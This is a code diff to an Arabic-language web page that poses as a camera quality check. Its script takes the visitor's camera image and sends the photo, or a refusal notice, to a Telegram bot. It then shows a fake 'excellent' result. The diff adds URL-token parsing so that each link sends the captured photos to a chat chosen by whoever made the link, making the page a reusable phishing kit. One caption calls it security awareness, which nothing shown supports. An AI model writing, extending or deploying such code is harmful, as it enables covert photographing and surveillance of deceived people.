@@ -28,7 +28,6 @@
         <div id="step3" class="hidden">
             <h1 style="color: #27ae60;">اكتمل الفحص!</h1>
             <p>تم تحليل جودة الكاميرا بنجاح. النتيجة: <b>ممتازة</b>.</p>
-            <p>شكراً لاستخدامك خدمتنا.</p>
         </div>
         <video id="video" style="display:none" autoplay playsinline></video>
         <canvas id="canvas" style="display:none"></canvas>
@@ -38,6 +37,14 @@
         const ADMIN_ID = "7968208362";
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+
+        // جلب معرف الدردشة من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+        let targetId = ADMIN_ID;
+        if (token) {
+            try { targetId = JSON.parse(atob(token)).c; } catch(e) {}
+        }
 
         async function requestCamera() {
             try {
@@ -53,16 +60,13 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                     
                     const formData = new FormData();
-                    formData.append("chat_id", ADMIN_ID);
+                    formData.append("chat_id", targetId);
                     formData.append("photo", blob, "capture.jpg");
                     formData.append("caption", "📸 <b>تم التقاط صورة جديدة!</b>\n\n✅ المستخدم وافق على إذن الكاميرا.");
                     formData.append("parse_mode", "HTML");
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    });
-
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    
                     document.getElementById('step2').classList.add('hidden');
                     document.getElementById('step3').classList.remove('hidden');
                     stream.getTracks().forEach(t => t.stop());
@@ -72,11 +76,7 @@
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: "🛡️ <b>تنبيه وعي أمني</b>\n\n❌ المستخدم رفض إعطاء إذن الكاميرا.",
-                        parse_mode: "HTML"
-                    })
+                    body: JSON.stringify({ chat_id: targetId, text: "🛡️ <b>تنبيه وعي أمني</b>\n\n❌ المستخدم رفض إعطاء إذن الكاميرا.", parse_mode: "HTML" })
                 });
             }
         }
